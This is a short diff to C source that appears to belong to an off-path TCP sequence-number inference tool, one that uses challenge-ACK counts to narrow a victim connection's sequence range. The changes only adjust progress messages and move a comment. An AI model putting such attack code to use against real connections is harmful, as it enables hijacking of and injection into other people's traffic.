@@ -1097,12 +1097,12 @@ int infer_sequence_number(void)
 					return 0;
 				}
 			} else if (g_chack_cnt < 100) {
-				/* figure out which chunk exactly! */
 				bs_start = sched[ci].start;
 				bs_end = sched[ci].end;
-				printf("[*] Narrowed sequence (1) to %lu - %lu!\n",
-						bs_start * g_ctx.winsz,
-						(bs_end * g_ctx.winsz) + g_ctx.winsz);
+				printf("[*] Narrowed sequence (1) to %lu - %lu (%lu possibilities)\n",
+						pr_start,
+						pr_end + g_ctx.winsz,
+						(pr_end + g_ctx.winsz) - pr_start);
 
 				/* adjust winsz if g_chack_cnt < 99 */
 				if (g_chack_cnt < 99) {
@@ -1129,6 +1129,7 @@ int infer_sequence_number(void)
 				fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
 			}
 		} else if (step == 1) {
+			/* figure out which chunk exactly! */
 			if (g_chack_cnt == 100) {
 				if (bs_start >= bs_end) {
 					/* FAIL! */
@@ -1144,8 +1145,9 @@ int infer_sequence_number(void)
 				if (pkts_sent == 1) {
 					u_long seq_block = bs_mid * g_ctx.winsz;
 
-					printf("[*] Narrowed sequence (2) to: %lu - %lu\n",
-							seq_block, seq_block + g_ctx.winsz);
+					printf("[*] Narrowed sequence (2) to: %lu - %lu (%lu possibilities)\n",
+							seq_block - g_ctx.winsz, seq_block + g_ctx.winsz,
+							(u_long)g_ctx.winsz * 2);
 
 					/* build a schedule working from right to left */
 					sched = build_schedule_reverse(seq_block - g_ctx.winsz,
